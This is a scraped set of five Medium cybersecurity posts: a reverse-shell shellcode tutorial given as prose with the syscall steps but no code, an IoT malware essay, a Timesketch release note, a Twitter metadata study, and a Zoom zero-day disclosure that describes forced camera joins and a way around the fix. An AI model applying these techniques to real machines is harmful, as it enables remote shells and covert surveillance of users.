Writing a Password Protected Reverse Shell (Linux/x64),https://medium.com/syscall59/writing-a-password-protected-reverse-shell-linux-x64-5f4d3a28d91a?source=tag_archive---------6-----------------------,"First of all, what are we trying to achieve here? Our goal is to write shellcode for the Linux x64 architecture that will connect back to a remote location over TCP/IPv4 and provide a shell only after the remote client provides a valid password.
In order to write a regular reverse shell, we need to chain several syscalls. The exact order is the following (we’ll take care of the authentication later):
1- We create a new socket to manage the new connection with the socket syscall
2- We connect to the target address issuing the connect syscall
3- We duplicate each standard stream into the new connection stream using the dup2 syscall, so the target machine can read and write messages to and from the source machine
4- We open up a shell by using the execve syscall
Each of these syscalls has a signature we need to address. Certain registers must contain specific values. For example, the rax register is used to identify the syscall that is executed so it should always contain the syscall number. A whole document containing a full syscall table can be found here
Let’s see an example of how to write a syscall
Now, this code has some issues. First of all, it’s remarkably long (48 bytes to be precise). Second, it contains a lot of null bytes. Let’s try to fix that!
The following implementation is 12 bytes long (a quarter of the last example) and contains no null bytes:
In order to put together the reverse shell, we need to write every syscall like this last example.
In order to add authentication, we need to read from the client file descriptor and compare the input against a password before executing the shell. The code should look roughly like this:
Basically, we read from the client file descriptor, then compare the input against a given password and repeat the process until it succeeds.
Armed with all our knowledge we are now prepared to chain every syscall and put together our reverse TCP shell. The following is an example implementation with added comments aimed to clarify each part of the process:
We can check the shellcode is working by assembling and linking this file, then extracting the shellcode and running it. I have some custom scripts that make this process a little bit easier by automating the assembly and linking process, the shellcode extraction and the generation of test skeletons to run our shellcode into. You may want to check those scripts and/or use them yourself (and report bugs/improvements of course!).
In order to test this we need to get something like netcat listening on port 4444, then fire our shellcode and it should connect back to our server. Here’s a graphic example:
We can also confirm/debug the syscalls being made by using strace. In the following recording, you can go ahead and find the socket & connect combo, then the repeated read syscalls, and finally, the dup2 * 3 and execve after the right password is provided.
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certificationStudent ID: SLAE64–1326Source code for the last version can be found here
Written by
","['About', 'Archive', 'Twitter', 'Cybersecurity', 'Infosec', 'Hacking', 'Linux', 'Shellcode']"
Your IoT Devices Can Be Hacked. Here’s What We Should Do About It.,https://onezero.medium.com/your-iot-devices-can-be-hacked-heres-what-we-should-do-about-it-64979d7c521e?source=tag_archive---------3-----------------------,"Where there is the internet, there is malware. As we start to bring connected lightbulbs, washing machines, and refrigerators into our homes, that relationship could be more dangerous than ever.
Last week, the Silex malware gave us a fresh glimpse into what it means for our “internet of things” (IoT) devices to become the target of a major attack, rendering them completely useless. Silex invisibly wipes the firmware on affected devices, not unlike what we saw with the BrickerBot attack in 2017 or the Mirai botnet, which produced record-setting denial-of-service attacks as hundreds of thousands of connected webcams, routers, DVRs, and other devices became infected. While this may not seem like a huge deal to you now, the IoT market is large and growing; in the future, as we come to rely on internet-connected devices for everything from our heat to our showers, an attack like this could be ruinous to millions of households around the world.
We’re accustomed to our computers occasionally being infected with malware, which we can usually clean up with some antivirus software. But what do you do if the virus is in your smart lightbulbs? Or your smart thermostat? We don’t really think of these devices as being “computers,” but they use operating systems just like your iPhone or PC.
Right now, there aren’t many options for consumers like you and me. It’s time to ask why.
Silex exploits devices running the open source Linux operating system, which the majority of IoT devices use. Many IoT manufacturers don’t build their own operating systems, because doing so would be expensive and time-consuming. Linux is free. It’s a no-brainer, right?
Well, not quite. The cost of “free” means manufacturers aren’t necessarily on top of their software, because they didn’t need to develop it themselves. It’s an easy solution that facilitates seven pages of “smart lightbulbs” on Amazon, many of which are from companies you’ve never heard of. Some manufacturers may not have the experience or money to configure Linux — or any of the associated software — correctly. Nor do they want to maintain their products long-term through regular software updates. Sometimes, they simply can’t update their hardware remotely due to poor software implementation, leaving thousands of devices vulnerable to attack.
Every day there’s a new connected category coming online, from fridges to stove knobs, and every device is yet another potential attack vector.
Because these devices obscure the operating system away from the user — they generally don’t have screens or keyboards, after all — it’s hard to inspect what’s going on, let alone take matters into your own hands. And while a massive company like Apple or Microsoft has a natural incentive to provide operating system updates to millions of computers around the world, it may be less clear to Generic LED Wi-Fi Lightbulb Factory why they should maintain and update the software in their particular version of Linux, assuming they even have the staff to support it in the first place.
As more of these devices come into our homes, whether we like it or not, how will we keep tabs on their behavior? It’s time for the IoT to get an old-fashioned antivirus scanner, a firewall, or at least some way to track what’s going on behind the scenes.
I’ve always wondered: Are my lights spying on me for the manufacturer, infected with a virus, or are they innocent helpers, simply doing what they’re told? I have no idea what my smart TV sends back to Samsung, nor do I really understand what Philips Hue knows about me. I’m certainly not sure if either of these devices is secure to begin with.
Symantec, an antivirus juggernaut, developed a physical router called the Norton Core that tried to solve this problem.
The router monitored connected devices and alerted users about problems or suspicious activity — but the company discontinued it after just months on the market due to lack of demand. (Consumers were apparently uninterested in paying a monthly subscription on top of the hardware purchase.)
The Norton Core was a good idea, too early to the market. This problem is still relatively new, and it only affects a small subset of people who have connected several devices in their homes to the internet. Even then, so few major exploits have happened — thus far — that it’s hard to justify an additional cost to protect against threats.
Eero, the Wi-Fi startup that was acquired by Amazon in 2018, offers basic features that help detect suspicious activity from smart devices and even promises that it can help prevent them from joining botnets — like the one that used millions of hacked cameras to take down websites — but it stops short of auditing the device’s traffic or checking its vulnerability to malware.
One piece of software gives me hope, however. It’s called the Princeton IoT Inspector. It’s a free, open-source tool made by Princeton researchers that helps reveal which devices are the most “talkative” on your network: There are graphs showing whether or not a device uses encryption, contacts tracking servers, and more. It almost feels like flipping a light on in a dark room.
You can’t get alerts about suspicious activity yet, but the tool does help you understand if something might be amiss behind the scenes. Before this tool, you had to rely on Samsung’s word that it wasn’t tracking your every move with its TVs — but now you can actually check.
The problem, unfortunately, is that most people aren’t going to be able to use this tool because it requires expert-level networking knowledge to set up. Many don’t know that they should care in the first place. It should be dead-easy to keep an eye on our devices and ensure they’re secure, but to get there, security features need to be built into things we’re already using.
The Google Wifi router, for example, would be the perfect place to help surface suspicious activity. It’s already in millions of homes around the world, because it’s so simple to set up and manage through a smartphone app. Adding IoT monitoring would make security accessible to people without adding an extra device or installing extra software.
Whatever the case, it’s clear that we’ll need something better soon. Every day there’s a new connected category coming online, from fridges to stove knobs, and every device represents yet another potential attack vector for malware. In many sectors, it’s becoming hard to avoid the connected option — good luck getting a TV that doesn’t connect to the internet these days — making the problem all the more dire.
The only way forward is taking control of our home networks and getting more powerful tools to help us see inside what’s happening with our devices. The question, still, is who will step up to the plate and help fix the problem.
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'Debugger', 'Digital Life', 'Cybersecurity', 'Malware']"
Your timeline is a story worth telling - Timesketch - Medium,https://medium.com/timesketch/your-timeline-is-a-story-worth-telling-6e2f2a9bfc0c?source=tag_archive---------6-----------------------,"Finding the right tool for digital forensic timeline analysis is challenging. Analysts tend to reach for tools like sed, grep, awk or even spreadsheets to get the job done. We have all been there. This works quiet well when the dataset is a few hundred thousand events and you are the only analyst on the case. But there are times when you need to analyze and correlate millions of events from more than one source. For example you need to collect and process artifacts from Windows, Linux and Mac, and sometimes even create full disk timelines with Plaso. The point being that the dataset tend to grow fast and making sense of it becomes difficult.
To answer questions like “How did the actor move laterally within our network?” becomes complicated. To scale analysis you need to collaborate and share findings with your colleagues. You need to be able to search across all your timelines at once. To keep the momentum you also need to hand over the current state of your investigation to the next analyst.
I created Timesketch to address these challenges. Timesketch is an open source collaborative forensic timeline analysis tool. It uses full text search to give you insight into your timelines. You can search hundreds of millions of events across different timelines all at once. Share your findings using saved views and add meaning to your data with labels and comments. Bring life to your investigation with Timesketch Stories. Timesketch is build around collaboration, sharing and search.
The Timesketch development team is proud to announce the release of Timesketch version 2016.11, codename “Looper”. This release introduces new features like advanced search, search templates and editable views. Let us explore how they can help you in your analysis work.
Timesketch lets you analyze your timelines in a completely new way. We call it Timesketch Stories. The story captures your notes, hypotheses and lets you embed interactive timeline events. Handing over the investigation now becomes part of your analysis workflow. Note: The data shown in the screenshots throughout this post are all fictional.
One of the central ideas in Timesketch is the ability to do full text search on your timelines. You have always been able to search with the Query String Query language. You can for example search based on boolean operators and regular expressions.
Boolean operators with grouping
Regular expressions
See the official documentation for a full list of features.
But sometimes you need more flexibility to get the results you need. With this release we introduce Advanced search. You are no longer limited to Query String Query for your searches. You can now use full Elasticsearch DSL queries right from the UI.
You can save your queries and filters as Saved views. The view gives you instant access to the results and also a quick way to share your findings. It is also how you embed events in your stories.
With this release we have made a couple of improvements to Saved views. First we made them editable. If you want to change the search query or filters you can now click the “Update view” button. This will save the changes to the view and make it available to all users. And of course, all stories that embeds the view will update automatically.
We have also added the ability to save only selected events as a Saved view. This is especially handy when you want to embed specific events in a story.
Search templates are like Saved views except they are not bound to any specific data. You can use templates to create new Saved views for your investigation.
Search templates can answer questions like “Who logged in over RDP?” or “Do I have any hits for this [Indicator of Compromise]?”. When you have created a view based on the template you can edit it by adding filters or changing the query. The templates supports both basic search and the new advanced search. It is easy to create new templates. Choose “Save as Search Template” when you create a new Saved view.
It is easy to create a new view in your investigation based on a Search template. Click the “Quick add” button and your are done.
When we create visualizations in Timesketch we want them to be meaningful. They should add value to your workflow. For example you can use the Heatmap chart to spot odd login patterns.
If you have ideas for visualizations in Timesketch, please speak up! Create a new feature request and we will take a look.
We are already planning for the next releases and here are some of the features you can look forward to:
If you have ideas for new features please file a feature request on GitHub. Thanks to all who made this release possible. Your fixes and bug reports are critical for the success of the project!
Johan is a Senior Security Engineer at Google. He is the author of Timesketch. If you like articles like this — or interested in open source digital forensic tools — you can follow him on Twitter.
If you want to fetch the code it is available over at GitHub. Installation instructions are available on the Wiki.
Written by
","['Cybersecurity', 'Infosec', 'Security', 'Dfir', 'Information Security']"
You will be surprised by what your Tweets may reveal about you and your habits,https://blog.0day.rocks/you-will-be-surprised-by-what-your-tweets-may-reveal-about-you-and-your-habits-3bc907688bc8?source=tag_archive---------3-----------------------,"I use Twitter every day. As a cybersecurity consultant it is by far one of the best tool to get the latest news and share information you find relevant to others. With the recent inauguration of Donald Trump, the regular Twitter goofs of the new staff and the creation of Twitter resistance groups I decided to demonstrate how easy it is to show revealing information from someone else account — without hacking it.
As any other social media website Twitter know a lot of things about you, thanks “metadata”. Indeed, for a 140 characters message you will get A LOT of metadata, more than 20 times the size of the initial content you typed in! And guess what? Almost all of this metadata is accessible through the open Twitter API.
Here are a few examples that could be exploited by anyone (not just government) to “fingerprint” and track someone:
Everybody knows the danger of geolocation leaks and how it can impact privacy. But few realize that just tweeting regularly can say a lot about your habits.
Taking apart a single tweet may reveal interesting metadata. Taking a few thousands of them and you can begin to see some patterns. That’s where the fun begins.
Having collected enough tweets from someone we can for example distinguish “corporate” accounts (only used during working hours) and even trying to guess how many users are interacting with the account.
To prove my point I developed a python script that retrieve all latest tweets from someone, scraping metadata, and measuring the activity per hours and days of the week.
Snowden posted 1682 tweets since September 2015. We can easily determine his sleep pattern as shown below (Moscow timezone).
Is Donald Trump account managed by multiple people? This time looking at the number of detected sources, I will let you guess…
I would highly suggest you to read the grugq’s Twitter security guidelines. In addition to that guide I would advise you to be careful of timezone/language used, also be aware that your tweets may be analyzed as a whole: don’t tweet at the same hours if don’t want people to guess your timezone. Of course, do this only if you wish to remain anonymous, don’t apply these principles with your main account (that would be a waste of time)!
I pushed my script on Github. It’s open-source so feel free to contribute �
Written by
","['Twitter', 'Privacy', 'Social Media', 'Cybersecurity', 'Python']"
Zoom Zero Day: 4+ Million Webcams & maybe an RCE? Just get them to visit your website!,https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5?source=tag_archive---------0-----------------------,"As far as I can tell this vulnerability also impacts Ringcentral. Ringcentral for their web conference system is a white labeled Zoom system.
According to Zoom, they will have a fix shipped by midnight tonight pacific time removing the hidden web server; hopefully this patches the most glaring parts of this vulnerability. The Zoom CEO has also assured us that they will be updating their application to further protect users privacy.
If you have updated Zoom to the latest version, you are now greeted with this new UI confirming you would actually like to join the meeting.
It has since come to light that Zoom and 13 of their white label applications contained a Remote Code Execution (RCE) vulnerability. Zoom, RingCentral, Telus Meetings, BT Cloud Phone Meetings, Office Suite HD Meeting, AT&T Video Meetings, BizConf, Huihui, UMeeting, Zhumu, Zoom CN, EarthLink Meeting Room, Video Conferencia Telmex, & Accession Meeting. Apple has since silently removed these applications from your computer by utilizing MRT.
This vulnerability allows any website to forcibly join a user to a Zoom call, with their video camera activated, without the user's permission.
On top of this, this vulnerability would have allowed any webpage to DOS (Denial of Service) a Mac by repeatedly joining a user to an invalid call.
Additionally, if you’ve ever installed the Zoom client and then uninstalled it, you still have a localhost web server on your machine that will happily re-install the Zoom client for you, without requiring any user interaction on your behalf besides visiting a webpage. This re-install ‘feature’ continues to work to this day.
This vulnerability leverages the amazingly simple Zoom feature where you can just send anyone a meeting link (for example https://zoom.us/j/492468757) and when they open that link in their browser their Zoom client is magically opened on their local machine. I was curious about how this amazing bit of functionality was implemented and how it had been implemented securely. Come to find out, it really hadn’t been implemented securely. Nor can I figure out a good way to do this that doesn’t require an additional bit of user interaction to be secure.
This vulnerability was originally responsibly disclosed on March 26, 2019. This initial report included a proposed description of a ‘quick fix’ Zoom could have implemented by simply changing their server logic. It took Zoom 10 days to confirm the vulnerability. The first actual meeting about how the vulnerability would be patched occurred on June 11th, 2019, only 18 days before the end of the 90-day public disclosure deadline. During this meeting, the details of the vulnerability were confirmed and Zoom’s planned solution was discussed. However, I was very easily able to spot and describe bypasses in their planned fix. At this point, Zoom was left with 18 days to resolve the vulnerability. On June 24th after 90 days of waiting, the last day before the public disclosure deadline, I discovered that Zoom had only implemented the ‘quick fix’ solution originally suggested.
Ultimately, Zoom failed at quickly confirming that the reported vulnerability actually existed and they failed at having a fix to the issue delivered to customers in a timely manner. An organization of this profile and with such a large user base should have been more proactive in protecting their users from attack.
On Mac, if you have ever installed Zoom, there is a web server on your local machine running on port 19421. You can confirm this server is present by running lsof -i :19421 in your terminal.
First off, let me start off by saying having an installed app that is running a web server on my local machine with a totally undocumented API feels incredibly sketchy to me. Secondly, the fact that any website that I visit can interact with this web server running on my machine is a huge red flag for me as a Security Researcher.
My original thoughts when I learned that this web server existed was that if there is a buffer overflow anywhere in the parameter handling of this web server, someone could achieve RCE on my machine. That’s not what I’ve found, but that was my original thought process.
If you look at what’s logged to the web developer console when visiting one of those Zoom ‘join’ links, you should see something like this:
I also found that, instead of making a regular AJAX request, this page instead loads an image from the Zoom web server that is locally running. The different dimensions of the image dictate the error/status code of the server. You can see that case-switch logic here.
The scary thing is that this enum seemed to indicate that this web server can do far more than just launch a Zoom meeting. What I found out was that this web server can also re-install the Zoom app if a user has uninstalled it, more on that later.
One question I asked is, why is this web server returning this data encoded in the dimensions of an image file? The reason is, it’s done to bypass Cross-Origin Resource Sharing (CORS). For very intentional reasons, the browser explicitly ignores any CORS policy for servers running on localhost.
Chrome does not support localhost for CORS requests (an open bug since 2010).- https://stackoverflow.com/questions/10883211/deadly-cors-when-http-localhost-is-the-origin
I’m guessing that this is intentionally done for security reasons. Regardless, it seems that Zoom is abusing a hack to bypass CORS protection. More on that later.
I created a personal meeting with a different account and cracked open Postman and started to remove parameters to see what the minimal GET request was that was required to launch a Zoom meeting.
There are a lot of random parameters that are sent to the localhost web server but the only ones that seem to matter are the following.
Using the following GET request from Postman I was successfully able to get my computer to join the Zoom call that the other account had created.
Once I had this, I started tinkering with what other “action” parameters I might be able to pass to get the client to do other things. I wasn’t able to find anything even after searching through the various public documents and the public ProtoBuff schema for hints about what hidden functionality may exist. Again, this webserver’s API is completely undocumented as far as I can tell and I’ve spent several hours searching for any mention of this Desktop web server in the official and unofficial documentation.
So now I had a minimal POC that I could use to maliciously get any user into a call, however, the default setting for the “New Meeting” is to allow the user to choose whether to join their Audio/Video. I would consider this alone a security vulnerability.
The above-described behavior continues to work to this day! You can still use this exploit to launch someone into a call without their permission.
I read about the Tenable Remote Code Execution in Zoom security vulnerability which was only patched within the last 6 months. Had the Tenable vulnerability been combined with this vulnerability it would have allowed RCE against any computer with the Zoom Mac client installed. If a similar future vulnerability were to be found, it would allow any website on the internet to achieve RCE on the user’s machine.
I advised Zoom that if they have any users that are still using Zoom 4.1.33259.0925 versions or lower, this would be a very potent attack.
So far, I could only achieve getting a user into a call without their permission. Although this has hypothetical security implications, I didn’t have a true exploit. I started tinkering with figuring out how to get someone’s camera activated. When setting up a meeting for work I was greeted with this screen.
Enabling “Participants: On” when setting up a meeting, I discovered that anyone joining my meeting automatically had their video connected.
When I got back to my personal machine, I tried this same functionality and found that it worked exactly the same.
This prompted me to create the Proof Of Concept below.
Proof Of Concept
The local client Zoom web server is running as a background process, so to exploit this, a user doesn’t even need to be “running” (in the traditional sense) the Zoom app to be vulnerable.
All a website would need to do is embed the above in their website and any Zoom user will be instantly connected with their video running. This is still true today!
This could be embedded in malicious ads, or it could be used as a part of a phishing campaign. If I were actually an attacker, I’d probably invest some time to also include the incrementing port logic that the code in the Javascript running on Zoom’s site.
A fully working POC that you can test out yourself can be found at the link below. Warning: Clicking this link on Mac will launch you into a Zoom call!https://jlleitschuh.org/zoom_vulnerability_poc/
A fully working POC that will launch you into a call with your video camera active can be found here. Warning: Clicking this link on Mac will launch you into a Zoom call with your camera activated!https://jlleitschuh.org/zoom_vulnerability_poc/zoompwn_iframe.html
Quick Fix
To fix the “auto join with video” part of the vulnerability, I advised Zoom on their backend server they immediately disable a meeting creator’s ability to automatically enable a participants video by default. I advised that this was 100%, not a complete fix. However, it could serve as a quick way to protect users from the invasion of privacy component of this attack.
I also advised that if there is hidden functionality where a meeting host can forcibly join computer audio (perhaps something I’m not seeing because I don’t have a Pro account), this should also be disabled.
I commented that allowing a host to choose whether or not a participant will automatically join with video should be considered it’s own standalone security vulnerability.
To this advisement, I received the following response:
Zoom believes in giving our customers the power to choose how they want to Zoom. This includes whether they want a seamless experience in joining a meeting with microphone and video automatically enabled, or if they want to manually enable these input devices after joining a meeting. Such configuration options are available in the Zoom Meeting client audio and video settings.
However, we also recognize the desire by some customers to have a confirmation dialog before joining a meeting. Based on your recommendations and feature requests from other customers, the Zoomteam [sic] is evaluating options for such a feature, as well as additional account level controls over user input device settings. We will be sure to keep you informed of our plans in this regard.
It’s important to note that the default configuration for Zoom is to allow a host to choose whether or not your camera is enabled or not by default.
Zoom did end up patching this vulnerability, but all they did was prevent the attacker from turning on the user’s video camera. They did not disable the ability for an attacker to forcibly join to a call anyone visiting a malicious site.
UPDATE: July 7th, 2019: There has been a regression in the fix implemented by Zoom thus allowing this vulnerability to be exploited with the video camera activated.
This same vulnerability also allowed the attacker to DOS any user’s machine. By simply sending repeated GET requests for a bad number, Zoom app would constantly request ‘focus’ from the OS. The following simple POC demonstrated this vulnerability.
This DOS vulnerability was patched in version 4.4.2 of the Zoom client.
If you have ever installed Zoom on your computer, this web server is installed. It continues to run if you uninstall Zoom from your computer.
This server also supports updating and installing a new version of Zoom in addition to launching a call. I did some additional decompilation of the Zoom web server to see the code path that these endpoints seemed to call.
Using Hopper Disassembler to disassemble the Objective-C bytecode of the web server I found the following method.
This method is gated by the following logic.
One of the API’s inside of this web server running on all Macs with Zoom installed is an endpoint that allows the current version of Zoom that’s installed to be updated or re-installed by this server.
You can confirm that this logic does indeed exist by doing the following:
Using the list of domains listed inside of the application that could be used to download updates for the Zoom app, I decided to check and see what each of the sites returned when visited. For example, here’s the result of visiting https://zipow.com/upgrade?os=mac
Doing a whois lookup on all of the domains listed in the source code returned some interesting results. For example, the domain zoomgov.com was scheduled to expire on May 1st, 2019. Had this domain registration been allowed to lapse, the takeover of this domain would have allowed an attacker to host an infected version of the Zoom installer from this site and infected users who had uninstalled Zoom from their computers. Essentially, this would have made this vulnerability a Remote Code Execution (RCE) vulnerability. I disclosed this bit of information to the Zoom team during my call with the Mozilla security team on April 26th, 2019. Within 5 hours of the end of that call that domain had been registered out to May 1st, 2024.
In my opinion, websites should not be talking to Desktop applications like this. There is a fundamental sandbox that browsers are supposed to enforce to prevent malicious code from being executed on users machines.
Having every Zoom user have a web server that accepts HTTP GET requests that trigger code outside of the browser sandbox is painting a huge target on the back of Zoom. It’s important to note that if you try to pull off the same exploit directly with a Javascript AJAX request, you are greeted with the following exception.
CORS-RFC1918
In discussing this vulnerability with both the Chromium and Mozilla Firefox security team they both said that they couldn’t do anything about this vulnerability. The Chromium team pointed me to CORS-RFC1918 which is a proposal that will require browser vendors to query users for permission before allowing sites to make requests against local resources like localhost and the 192.168.1.* address space.
Linked in that RFC is a wonderful and fun to read bug report where Tavis Ormandy of Google’s Project Zero found a similar vulnerability in TrendMicro’s Password Manager allowing remote code execution via the browser and the exfiltration of a user’s passwords from a password vault. That story is well worth the read.
When this same vulnerability was reported to the Mozilla Firefox team, they closed it as it wasn’t considered a vulnerability against Firefox. However, they soon reopened the report as a vulnerability against their internal infrastructure. As a result, I was invited into a call with the Zoom and Mozilla Firefox team to discuss the vulnerability on April 26th, 2019. During this call, they promised Mozilla and me that this vulnerability would be patched well before the end of the 90-day disclosure deadline. This turned out to be false.
The fix proposed by the Zoom team was to digitally ‘sign’ the request made to the client. However, this simply means that an attacker would have to have a backend server that makes requests to the Zoom site first to gain a valid signature before forwarding the signature on to the client.
They also proposed locking the signature to the IP that made the request. This would mean that as long as the attacker’s server was behind the same NAT router as the victim, the attack would still work.
I described to the Zoom team how both of these solutions were not enough to fully protect their users. Unfortunately, this left the Zoom team with only 18 days before public disclosure to come up with some better solution.
Unfortunately, even after my warning, this was the solution they chose to go with. This new signature or token is embedded in a new parameter called confid. The simplest way to bypass this new confid check was to simply use the iframe workaround described above. Alternatively, if you and the victim are behind the same NAT router, you can make a request for the join page, extract the #lhs_launch_parames field from the HTML document and embed it in the HTML response from the malicious page.
As of 2015 Zoom had over 40 million users. Given that Macs are 10% of the PC market and Zoom has had significant growth since 2015 we can assume that at least 4 million of Zoom’s users are on Mac. Tools like Zoom, Google Meet or Skype for Business is a staple of today's modern office.
Any vulnerability in an application with this many users must be considered a serious threat to all those users. All of the vulnerabilities described in this report can be exploited via “drive-by attack” methodologies. Many times during my conversation with the Zoom security team they seemed to argue that the seriousness of this vulnerability was limited because it would require “user interaction” to exploit these. My response to this was finally “I would highly suggest that you not hang your hat on ‘user interaction required’ for protecting your users given that this ‘user interaction’ is simply clicking a link or visiting a webpage.”
I believe that in order to fully protect users, I truly believe that this localhost web server solution needs to be removed. Alternative methodologies like registering custom URI handlers (for example, a zoom:// URI handler) with the browsers is a more secure solution. When these URI handlers are triggered, the browser explicitly prompts the user for confirmation about opening the app. According to the Zoom team, the only reason this localhost server continues to exist is that Apple’s Safari doesn’t support URI handlers.
This is essentially a Zero Day. Unfortunately, Zoom has not fixed this vulnerability in the allotted 90-day disclosure window I gave them, as is the industry standard. As such, the 4+ million users of Zoom on Mac are now vulnerable to an invasion of their privacy by using this service.
Additionally, due to a lack of sufficient auto-update capabilities, many users continue to run outdated versions of Zoom for months after new releases are shipped leaving them vulnerable to exploits like these.
If you want to patch this vulnerability for yourself you can do the following.Disable the ability for Zoom to turn on your webcam when joining a meeting.
Alternatively, use this terminal command.
To shut down the web server, run lsof -i :19421 to get the PID of the process, then do kill -9 [process number]. Then you can delete the ~/.zoomus directory to remove the web server application files.
To prevent this server from being restored after updates you can execute the following in your terminal:
If you want a full description of how to resolve this on Windows and Mac see the Gist below.
Given the massive install base for Zoom, I highly recommend that other researchers take the time to explore this Zoom web server to see what other vulnerabilities exist. This being said, I also recommend that any researcher that finds a vulnerability in Zoom’s software does not directly report the vulnerability to Zoom. Instead, I recommend that researchers report these vulnerabilities via the Zero Day Initiative (ZDI). The ZDI disclosure program gives vendors 120 days to resolve the vulnerability, the ZDI will pay researchers for their work, and researchers have the ability to publicly disclose their findings.
If you want to decompile the Zoom client application for yourself, it’s located in the ~/.zoomus directory on your computer.
The source code repository for my POC examples can be found on GitHub.
Did this research & writeup help you or your company? Consider sponsoring me by donating to my college loan repayment fund. Every bit helps.
Follow Infosec Write-ups for more such awesome write-ups.
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'CVE-2019–13449', 'CVE-2019–13450', 'Security', 'Zoom', 'Cybersecurity', 'Software Security']"
